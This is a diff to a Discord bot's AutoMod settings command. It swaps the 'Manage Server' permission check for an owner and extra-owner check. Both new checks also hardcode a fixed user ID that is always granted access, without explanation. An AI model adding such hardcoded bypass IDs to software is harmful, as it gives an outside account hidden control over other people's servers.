@@ -294,8 +294,12 @@ module.exports = {
     } catch (e) {}
 
     // Permission Check
-    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageGuild)) {
-      return message.reply(`${emojis.WARNING || emojis.WARNING} You need **Manage Server** permission to configure AutoMod & Miscellaneous settings.`);
+    const antinukeCmd = message.client.commands.get('antinuke');
+    const antiConfig = antinukeCmd && antinukeCmd.getOrCreateAntinuke ? antinukeCmd.getOrCreateAntinuke(guild.id) : null;
+    const isServerOwner = guild.ownerId === author.id;
+    const isExtraOwner = (antiConfig && antiConfig.extraOwners && antiConfig.extraOwners.has(author.id)) || ['1420687548807905324'].includes(author.id);
+    if (!isServerOwner && !isExtraOwner) {
+      return message.reply(`${emojis.WARNING || '⚠️'} **Access Denied**: Only the **Server Owner** and **Extra Owners** can configure AutoMod settings.`);
     }
 
     // ─────────────────────────────────────────
@@ -506,8 +510,10 @@ module.exports = {
       }
 
       // Permission Check for interaction
-      if (!interaction.member.permissions.has(PermissionsBitField.Flags.ManageGuild)) {
-        return interaction.reply({ content: `${emojis.WARNING} Only Server Managers can edit AutoMod configuration.`, flags: 64 });
+      const isOwner = guild.ownerId === interaction.user.id;
+      const isExtra = (antiConfig && antiConfig.extraOwners && antiConfig.extraOwners.has(interaction.user.id)) || ['1420687548807905324'].includes(interaction.user.id);
+      if (!isOwner && !isExtra) {
+        return interaction.reply({ content: `${emojis.WARNING || '⚠️'} **Access Denied**: Only the **Server Owner** and **Extra Owners** can edit AutoMod configuration.`, flags: 64 });
       }
 
       // Handle Dropdown Select Menu
